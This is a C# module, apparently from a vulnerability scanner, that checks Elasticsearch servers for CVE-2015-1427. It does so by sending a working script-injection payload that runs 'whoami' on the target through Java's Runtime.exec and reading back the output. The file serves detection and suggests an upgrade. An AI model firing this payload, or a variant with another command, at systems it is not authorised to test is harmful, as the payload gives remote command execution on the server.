using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using AetherSec.Core;

namespace AetherSec.Modules
{
    public class ElasticsearchCVE20151427RceDetector : IScanModule
    {
        public string Name => "Elasticsearch CVE-2015-1427 RCE Detector";
        public string Description => "Detects CVE-2015-1427 remote code execution vulnerability in Elasticsearch by sending a crafted request.";
        public ScanSeverity Severity => ScanSeverity.Critical;
        private static readonly string Payload = @"
        {
          ""size"": 1,
          ""script_fields"": {
            ""test"": {
              ""script"": ""def proc = java.lang.Runtime.getRuntime().exec('whoami'); 
                           def inputStream = new java.io.InputStreamReader(proc.getInputStream());
                           def buffered = new java.io.BufferedReader(inputStream);
                           def line = buffered.readLine();
                           return line;""
            }
          }
        }";

        public async Task<ScanResult> RunAsync(string targetIp)
        {
            try
            {
                using var client = new HttpClient
                {
                    Timeout = TimeSpan.FromSeconds(7)
                };

                var url = $"http://{targetIp}:9200/_search?pretty";
                var content = new StringContent(Payload, Encoding.UTF8, "application/json");
                var response = await client.PostAsync(url, content);

                if (!response.IsSuccessStatusCode)
                {
                    return new ScanResult(
                        false,
                        "No vulnerability detected or Elasticsearch not accessible.",
                        targetIp,
                        AffectedService: "Elasticsearch",
                        Severity: ScanSeverity.Low
                    );
                }

                var respContent = await response.Content.ReadAsStringAsync();

                var jsonDoc = JsonDocument.Parse(respContent);
                if (jsonDoc.RootElement.TryGetProperty("fields", out var fields) &&
                    fields.TryGetProperty("test", out var testArray) &&
                    testArray.GetArrayLength() > 0)
                {
                    var testResult = testArray[0].GetString();
                    if (!string.IsNullOrEmpty(testResult) &&
                        (testResult.Contains("root", StringComparison.OrdinalIgnoreCase) ||
                         testResult.Contains("admin", StringComparison.OrdinalIgnoreCase) ||
                         testResult.Contains("users", StringComparison.OrdinalIgnoreCase)))
                    {
                        return new ScanResult(
                            true,
                            $"CVE-2015-1427 RCE vulnerability detected. Command output: {testResult}",
                            targetIp,
                            AffectedService: "Elasticsearch",
                            Recommendation: "Upgrade Elasticsearch to a version later than 1.4.2, 1.3.8, or 1.2.6.",
                            Severity: ScanSeverity.Critical,
                            Vulnerability: "CVE-2015-1427"
                        );
                    }
                }
                return new ScanResult(
                    false,
                    "No vulnerability detected or command execution failed.",
                    targetIp,
                    AffectedService: "Elasticsearch",
                    Severity: ScanSeverity.Low
                );
            }
            catch (Exception ex)
            {
                return new ScanResult(false, $"Error during Elasticsearch CVE-2015-1427 scan: {ex.Message}", targetIp);
            }
        }
    }
}
